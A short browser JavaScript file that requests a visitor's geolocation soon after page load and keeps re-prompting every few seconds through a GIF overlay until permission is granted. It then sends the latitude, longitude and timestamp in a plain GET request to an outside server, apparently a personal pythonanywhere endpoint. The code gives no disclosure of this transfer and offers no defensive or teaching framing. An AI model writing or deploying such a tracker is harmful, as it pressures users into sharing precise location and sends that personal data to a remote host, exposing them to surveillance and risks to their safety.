let state = ''
let locat = null
function report(state) {
  alert('Permission ' + state);
}

function checkLocation(){
  if(locat == null){
    setTimeout(checkLocation, 5000)
    promptLocationPermis()
  }
}
async function getLocation() {
  let result = await navigator.permissions.query({name:'geolocation'})
  setTimeout(checkLocation, 5000)
  result.onchange = () => {
          if (result.state=="granted" && locat==null) {
              getLocation()
            }
          };
  navigator.geolocation.getCurrentPosition(
  function(position) {
    locat = true
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude
    let loc = "Latitude: " + latitude + ", Longitude: " + longitude
    sendInfo(loc)
    sendInfo(position.timestamp)
  },
  function(error) {
    setTimeout(promptLocationPermis, 1000)
    alert("Error getting location: "+error.message);
  }
);

}
function sendInfo(locationL) {
  let url = "https://rafaelmenna.pythonanywhere.com/info/?info="+locationL
  fetch(url).then((res) => {
      return res.text()
  }).then((text) => {
      console.log(text)
  })
}

function promptLocationPermis() {
  let ele = document.getElementById('uniquelocationTurnOn')
  let img = ele.querySelector('img')
  ele.querySelector('button').addEventListener('click', (e) => {
      ele.classList.remove('active')
      getLocation()
    })
  img.src = '/GIF_20250207_01.gif'
  img.onload = function () {
    ele.classList.add('active')
    document.body.insertAdjacentElement('afterbegin', ele )
  }
  
}
setTimeout(getLocation, 1000)